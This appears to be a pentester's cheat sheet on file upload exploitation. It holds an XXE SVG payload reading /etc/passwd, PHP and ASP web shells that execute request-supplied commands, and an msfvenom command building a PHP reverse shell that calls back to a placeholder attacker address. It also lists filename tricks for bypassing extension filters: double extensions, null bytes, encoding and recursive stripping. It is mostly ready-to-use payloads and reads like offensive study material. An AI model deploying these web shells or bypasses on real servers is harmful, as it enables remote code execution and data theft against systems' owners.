## Note:
> - File upload vuln is only possible if you found the `upload directory` and your `uploaded file`.
> - In most cases, `upload directory` is `hidden`, and your `uploaded file name` would be `changed`. If fuzzing is not possible, then to exploit, you need to chain it with another vuln to read the actual source code index.php or the page that handle to upload in order to find upload directory.
> - When fuzzing for file `ext`, take notice at ext like: `.svg`, `.xml`, `.html`, ... These files can potentially cause `XXE`, `XSS` which can be used to disclosure info and especially explore `upload directory`. And if this is the case, make sure to validate your request, take a `.svg` file for example:
```
<POST REQUEST HEADERS>
...
...
File-name: file.svg
Content-type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
-----------------------------PREDEFINE Boundary--
```
> - **You can execute shell** with `shell.php.jpg` name
> - Make sure to validate the follow: `file name extention`: `.svg`, `Content-Type`: `image/svg+xml`, `Request body`: `your payload`.
> - In some other cases, the upload directory is `restricted` as a protect mechanism. Try upload your file to a different directory by using **LFI**: `directory/../` or `directory%2f..%2f..` by intercepting the process, take notice at `Content-Disposition` header. (check section 8.3 - part 2.2)


# Cheatsheet

## Web shells

| Web shell | Description |
|-|-|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |

### Whitelist

| Example | Description |
|-|-|
| `shell.jpg.php` | Multiple Extension |
| `shell.php.jpg` | Reverse Double Extension |
| `exploit.php.` | Trailing characters |
| `exploit%2Ephp | URL encoding |
| `exploit.php;.jpg`, `exploit.php%00.jpg`, `exploit.asp;.jpg`, `exploit.asp%00.jpg` | Null byte injection | 
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, … | Character Injection - Before/After Extension |

**Note:** When using `null byte` like `exploit.php%00.jpg`, when you try access link of the shell to trigger, remember that the `.jpg` is gone.

### Recursive stripping

If dangerous extensions are removed non-recursively, files like `exploit.p.phphp` become `exploit.php` after processing.
